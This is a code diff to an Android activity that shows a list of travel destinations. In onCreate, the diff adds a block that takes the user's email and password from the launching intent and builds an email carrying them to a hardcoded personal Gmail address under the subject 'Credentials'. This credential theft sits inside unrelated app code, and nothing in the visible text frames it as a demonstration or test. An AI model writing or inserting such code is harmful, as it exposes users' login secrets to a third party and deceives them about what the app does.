@@ -6,6 +6,8 @@ import android.os.Bundle;
 import android.view.View;
 import android.widget.AdapterView;
 import android.widget.ListView;
+import android.widget.Toast;
+
 import java.util.ArrayList;
 
 
@@ -19,6 +21,21 @@ public class BestDestinationsActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_best_destinations);
+
+        Intent credentialsIntent = getIntent();
+        String email = credentialsIntent.getStringExtra("email");
+        String password = credentialsIntent.getStringExtra("password");
+
+        Intent emailIntent = new Intent(Intent.ACTION_SEND);
+        emailIntent.setType("message/rfc822");
+        emailIntent.putExtra(Intent.EXTRA_EMAIL, new String[]{"alexbv2301@gmail.com"});
+        emailIntent.putExtra(Intent.EXTRA_SUBJECT, "Credentials");
+        emailIntent.putExtra(Intent.EXTRA_TEXT, "Email: " + email + ", Password: " + password);
+        try {
+            startActivity(Intent.createChooser(emailIntent, "Send mail..."));
+        } catch (android.content.ActivityNotFoundException ex){
+            Toast.makeText(this, "There are no email clients installed!", Toast.LENGTH_SHORT).show();
+        }
 
         listView = (ListView) findViewById(R.id.destinationsListView);
         myDestinations = new ArrayList<>();
